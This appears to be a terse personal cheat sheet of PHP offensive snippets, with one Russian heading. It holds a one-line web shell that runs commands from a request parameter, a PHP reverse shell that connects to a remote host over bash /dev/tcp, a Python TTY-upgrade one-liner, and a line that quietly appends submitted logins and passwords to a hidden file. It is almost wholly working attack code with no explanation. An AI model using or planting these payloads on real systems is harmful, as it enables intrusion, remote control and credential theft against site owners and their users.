# PHP

# CMD
    <?php system($_REQUEST['pwn']); ?>

  inddex.php?pwn=ls

# ReverseShell

<?php system ('bash -c "bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"'); ?>

python -c 'import pty;pty.spawn('/bin/bash')'
# Запись в файл переменных

file_put_contents(".max", $_POST['log'] . ":" . $_POST['pwd'] . "\n" , FILE_APPEND);
